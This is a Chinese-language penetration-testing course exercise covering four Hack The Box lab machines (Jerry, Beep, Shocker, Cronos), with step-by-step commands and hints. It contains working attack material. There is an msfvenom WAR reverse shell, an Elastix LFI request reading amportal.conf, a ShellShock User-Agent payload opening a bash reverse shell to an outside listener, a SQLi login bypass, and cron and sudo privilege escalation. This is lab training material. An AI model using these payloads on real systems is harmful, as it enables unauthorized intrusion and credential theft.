# 練習 B — 4 台 Web 主題 HTB 機器

> 目標：把 Ch 10–15 的 Web 攻擊技術用在實際靶機上，每台機器從初始枚舉到取得 root/SYSTEM shell。

## 練習說明

這 4 台機器要你**打到底**：拿到初始立足點 + root/SYSTEM 提權。Web 枚舉和漏洞利用是主線，提權用你在 Part 5/6 學到的技術（如果還沒讀，現在先略過提權部分，之後再回來）。

## 四台目標機器

| 機器 | OS | 難度 | 主要漏洞類型 |
|------|-----|------|------------|
| **Jerry** | Windows | Easy | Tomcat 預設憑證 + WAR 上傳 |
| **Beep** | Linux | Easy | LFI / 多個漏洞路徑 |
| **Shocker** | Linux | Easy | ShellShock（Apache mod_cgi）|
| **Cronos** | Linux | Medium | DNS 枚舉 + SQLi + 排程任務提權 |

## 機器一：Jerry（Tomcat 預設憑證）

**目標**：找到 Tomcat 管理介面 → 預設憑證 → 上傳 WAR webshell → RCE → System

```bash
TARGET="10.10.10.95"

# Step 1：枚舉
nmap -p- --min-rate 5000 $TARGET
# 主要開 8080（Tomcat）

# Step 2：訪問管理介面
# http://10.10.10.95:8080/manager/html
# 試預設憑證：tomcat:s3cret, admin:admin, tomcat:tomcat

# Step 3：生成 WAR webshell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war

# Step 4：上傳 WAR 到 Tomcat Manager
# 在 /manager/html 頁面 Deploy section 上傳

# Step 5：觸發
nc -nvlp 4444
curl http://10.10.10.95:8080/shell/
```

<details>
<summary>Jerry 解題提示</summary>

預設憑證是 `tomcat:s3cret`（在 Tomcat 文件裡找得到）。WAR 上傳後，訪問 `http://target:8080/warname/` 觸發。

Tomcat 在 Windows 通常以 SYSTEM 權限跑，所以拿到 shell 就是 SYSTEM，不需要額外提權。

</details>

## 機器二：Beep（多路徑 LFI）

**目標**：Web 枚舉 → LFI 讀設定檔 → 取得憑證 → 利用其中一個入口

```bash
TARGET="10.10.10.7"

# Step 1：枚舉
nmap -p- --min-rate 5000 $TARGET
nmap -p 22,25,80,110,111,143,443,879,993,995,3306,4190,4445,4559,5038,10000 -sC -sV $TARGET

# Step 2：訪問 HTTPS（自簽憑證，加 -k）
# https://10.10.10.7 → Elastix（VoIP 平台）
# searchsploit elastix

# Step 3：LFI
# Elastix 有 LFI 漏洞在 /vtigercrm/graph.php
curl -k "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action"

# Step 4：讀設定檔，找資料庫/管理員密碼
# 密碼可以用在 SSH、Webmin 等地方
```

<details>
<summary>Beep 解題提示</summary>

LFI 能讀到 `/etc/amportal.conf`，裡面有 FreePBX 的管理員密碼。這個密碼往往也是 root 的 SSH 密碼（密碼重用）。

另一個路徑是 Webmin（port 10000）的 Shellshock 漏洞。

</details>

## 機器三：Shocker（ShellShock）

**目標**：找 cgi-bin 目錄 → ShellShock 攻擊 → 取得 shell → sudo 提權

```bash
TARGET="10.10.10.56"

# Step 1：枚舉
nmap -p 80,2222 -sC -sV $TARGET

# Step 2：目錄爆破（重點找 /cgi-bin/）
gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# 再找 cgi-bin 裡面的腳本
gobuster dir -u http://$TARGET/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x sh,pl,cgi

# Step 3：ShellShock 測試
# ShellShock 透過 User-Agent 或其他 HTTP Header 注入
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" http://$TARGET/cgi-bin/user.sh

# Step 4：同時開監聽
nc -nvlp 4444

# Step 5：sudo -l 看提權路徑
# sudo perl → GTFOBins 查 perl
```

<details>
<summary>Shocker 解題提示</summary>

ShellShock（CVE-2014-6271）讓你透過 Bash 環境變數執行任意命令。CGI 腳本把 HTTP Header 設為環境變數，所以 User-Agent 含有 ShellShock payload 就會被執行。

提權：`sudo -l` 會顯示可以用 sudo 跑 perl，`sudo perl -e 'exec "/bin/bash"'` 直接提權。

</details>

## 機器四：Cronos（DNS + SQLi + Cron）

**目標**：DNS 枚舉找子域名 → SQLi 登入繞過 → 命令注入 → Cron 提權

```bash
TARGET="10.10.10.13"

# Step 1：枚舉
nmap -p- --min-rate 5000 $TARGET
# 主要：22, 53, 80

# Step 2：DNS 枚舉（DNS 53 開著，很可能有 zone）
nslookup
> server 10.10.10.13
> 10.10.10.13
# 拿到 hostname：cronos.htb

# 嘗試 Zone Transfer
dig axfr cronos.htb @10.10.10.13
# 應該能看到 admin.cronos.htb

# Step 3：設定 /etc/hosts
echo "10.10.10.13 cronos.htb admin.cronos.htb" >> /etc/hosts

# Step 4：訪問 admin.cronos.htb
# 登入頁面 → SQLi 繞過
# username: admin'-- password: anything

# Step 5：拿到 shell（應用有 ping/traceroute 功能，試命令注入）
# 反彈 shell

# Step 6：查看 crontab
cat /etc/crontab
# root 定時執行 /var/www/laravel/artisan
# 你能寫入這個檔案嗎？
ls -la /var/www/laravel/artisan
```

<details>
<summary>Cronos 解題提示</summary>

Zone Transfer 給你 `admin.cronos.htb`。管理介面有 SQLi 登入繞過。進去後的網路工具有命令注入，可以反彈 shell。

提權：root crontab 每分鐘跑 `php /var/www/laravel/artisan`，這個檔案你有寫入權限。改成 PHP 反彈 shell，等一分鐘就有 root。

</details>

## 完成標準

| 機器 | 完成條件 |
|------|---------|
| Jerry | 取得 local.txt（user flag）和 proof.txt（system flag） |
| Beep | 取得 user flag 和 root flag |
| Shocker | 取得 user flag 和 root flag |
| Cronos | 取得 user flag 和 root flag |

## 筆記要求

每台機器完成後寫一份 200–400 字的攻擊摘要：

```markdown
## 機器名

### 初始立足
- 枚舉發現：XXX
- 利用方式：XXX
- 取得：[low privilege shell / user account]

### 提權
- 發現：XXX（linPEAS / 手動枚舉）
- 方法：XXX
- 取得：root/SYSTEM

### 關鍵截圖
- [ ] whoami（初始立足後）
- [ ] local.txt 內容 + ifconfig
- [ ] whoami（提權後）
- [ ] proof.txt 內容 + ifconfig
```

## 自我檢核

- [ ] Jerry：用預設憑證進 Tomcat，上傳 WAR 拿到 shell
- [ ] Beep：用 LFI 讀到設定檔，找到可用的憑證
- [ ] Shocker：用 ShellShock 透過 HTTP Header 注入，拿到 shell
- [ ] Cronos：用 Zone Transfer 找到子域名，SQLi 登入繞過

→ [Ch 16 Metasploit 框架精通：search / use / exploit](./16-metasploit.md)
